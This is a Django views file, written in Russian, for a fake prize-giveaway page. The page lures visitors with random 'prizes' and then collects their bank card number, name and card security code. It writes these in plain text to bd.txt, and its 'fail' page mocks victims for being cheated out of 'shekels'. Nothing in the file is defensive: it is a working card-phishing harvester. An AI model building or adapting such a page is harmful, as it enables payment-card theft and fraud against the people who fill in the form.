from django.http import HttpResponse
from django.shortcuts import render, redirect
from random import randint
# Create your views here.


def index(request):
    if request.method == 'GET':
        prizes = ['раба', 'пентхаус на берегу моря', 'АААААвтомобиль', 'новую жизнь', 'по жизни', 'МИЛЛИОН ДОЛЛАРОВ!!!']
        prize = prizes[randint(0, 5)]
        return render(request, 'index.html', {'prize': prize})

    if request.method == 'POST':

        number = request.POST.get('number', '')
        name = request.POST.get('name', '')
        key = request.POST.get('key', '')

        if len(number) != 16:
            return HttpResponse('Введите номер банковской карточки корректно!')
        if not name:
            return HttpResponse('Введите имя и фамилию.')
        if not key or not key.isdigit():
            return HttpResponse('Введите код на задней панели правильно.')

        with open('bd.txt', 'a') as f:
            f.write(number + ' ' + name + ' ' + key + '\n')
        return redirect('/success')


def success(request):
    return render(request, 'index1.html')


def fail(request):
    return HttpResponse('Нигде, тебя нахитрили на шекели.')
